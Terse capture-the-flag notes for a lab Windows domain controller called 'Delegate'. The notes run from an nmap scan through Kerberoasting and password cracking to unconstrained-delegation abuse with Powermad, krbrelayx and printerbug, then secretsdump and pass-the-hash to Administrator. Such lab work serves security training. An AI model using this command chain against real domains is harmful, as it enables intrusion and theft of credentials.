Scan 
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-09 17:46:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2024-08-08T17:45:40
|_Not valid after:  2025-02-07T17:45:40
|_ssl-date: 2024-08-09T17:47:03+00:00; -2s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-09T17:46:23+00:00
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time:
|   date: 2024-08-09T17:46:26
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

```

User : 
```sh
awk '{print $6}' us.txt| cut -d '\' -f 2 > users.txt

DC1$ 
A.Briggs 
b.Brown 
R.Cooper 
J.Roberts 
N.Thompson 
```

Password: 
```sh
[+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

All generic write on N.THOMPSON: 

```sh
bloodhound-python -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123' -ns 10.10.112.18 -dc DC1.delegate.vl -c all

targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

password: KALEB_2341
-------------------------------------------------------------------------------
#Doesn't work 

pywhisker.py -d "delegate.vl" -u "A.Briggs" -p "P4ssw0rd1#123" --target "N.THOMPSON" --action "add"

gettgtpkinit.py delegate.vl/N.Thompson -cert-pfx 2R7BnP5C.pfx -pfx-pass FOvfSWBoYdd0WWqNtCv1 N.thompson.ccache

```

- Cred : 
```
N.Thompson : KALEB_2341
```

User: VL{29f9de899146d9a73574b873855eefef}

```sh
evil-winrm -i $t -u "N.Thompson" -p "KALEB_2341"
nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
```

Enum  unconstrained Delegation
```sh
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

Powermad  : 

```sh
Import-Module ./Powermad.ps1

New-MachineAccount -MachineAccount pwned -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)

Set-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value 528384

Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append

Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose

dnstool.py -u 'delegate.vl\pwned$' -p 12345 -r pwned.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t

krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC

printerbug.py delegate.vl/'UwU$'@dc1.delegate.vl UwU.delegate.vl
```


https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
------------------------------------------------------------------------
Linux : 
```sh
0

dnstool.py -u 'delegate.vl\UwU$' -p TestPassword321 -r UwU.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl --additional

addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.10.85.247 DC1.delegate.vl

bloodyAD.py -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'UwU$' -f TRUSTED_FOR_DELEGATION

krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC

printerbug.py delegate.vl/'UwU$'@dc1.delegate.vl UwU.delegate.vl

```

- Dumping hashes
```sh
export KRB5CCNAME=`pwd`/'krbtgt.ccache
secretsdump.py -k DC1.delegate.vl -just-dc-ntlm
hash : c32198ceab4cc695e65045562aa3ee93
evil-winrm -i $t -u "Administrator" -H "c32198ceab4cc695e65045562aa3ee93"
```

Root : VL{1205f239c3aaaf1e6f7ac423a1fb3c16}

